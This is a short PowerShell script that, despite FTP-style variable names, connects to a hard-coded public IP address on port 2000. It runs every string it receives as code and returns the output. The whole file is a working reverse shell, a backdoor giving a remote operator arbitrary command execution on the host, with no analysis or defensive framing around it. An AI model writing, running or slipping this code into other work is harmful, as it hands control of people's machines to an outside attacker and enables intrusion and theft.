$FTPServer = "35.200.251.56"
$FTPPort = "2000"

$connection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$stream = $connection.GetStream()

$EncodedText = New-Object System.Text.ASCIIEncoding

while ($connection.Connected) {
    if ( $stream.DataAvailable ){
        $bytes = New-Object System.Byte[] $connection.Available
        $stream.Read($bytes,0,$bytes.Length)
        $data = $EncodedText.GetString($bytes,0, $bytes.Length)
        Write-Output $data
        $result = [scriptblock]::Create($data).Invoke()
        $msg = $EncodedText.GetBytes($result+'&')
        $stream.Write($msg,0,$msg.Length)
        #Write-Host -NoNewline $data
    }
    
}


$connection.Close()
